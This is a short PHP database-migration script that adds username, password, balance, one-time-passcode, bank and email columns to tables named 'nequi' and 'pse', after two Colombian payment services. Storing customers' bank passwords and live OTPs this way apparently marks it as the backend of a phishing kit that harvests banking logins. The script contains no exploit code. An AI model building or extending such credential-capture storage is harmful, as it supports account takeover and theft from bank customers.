<?php
// setup/update_db_admin.php
require_once __DIR__ . '/../config/db.php';

try {
    echo "Actualizando tabla NEQUI...\n";
    $conn->exec("ALTER TABLE nequi ADD COLUMN IF NOT EXISTS usuario VARCHAR(255)");
    $conn->exec("ALTER TABLE nequi ADD COLUMN IF NOT EXISTS clave VARCHAR(255)");
    $conn->exec("ALTER TABLE nequi ADD COLUMN IF NOT EXISTS saldo VARCHAR(50)");
    $conn->exec("ALTER TABLE nequi ADD COLUMN IF NOT EXISTS otp VARCHAR(20)");

    echo "Actualizando tabla PSE...\n";
    $conn->exec("ALTER TABLE pse ADD COLUMN IF NOT EXISTS usuario VARCHAR(255)");
    $conn->exec("ALTER TABLE pse ADD COLUMN IF NOT EXISTS clave VARCHAR(255)");
    $conn->exec("ALTER TABLE pse ADD COLUMN IF NOT EXISTS banco VARCHAR(100)");
    $conn->exec("ALTER TABLE pse ADD COLUMN IF NOT EXISTS otp VARCHAR(20)");
    $conn->exec("ALTER TABLE pse ADD COLUMN IF NOT EXISTS email VARCHAR(255)");

    echo "✅ Tablas actualizadas con éxito.\n";
} catch (PDOException $e) {
    echo "❌ Error: " . $e->getMessage() . "\n";
}
?>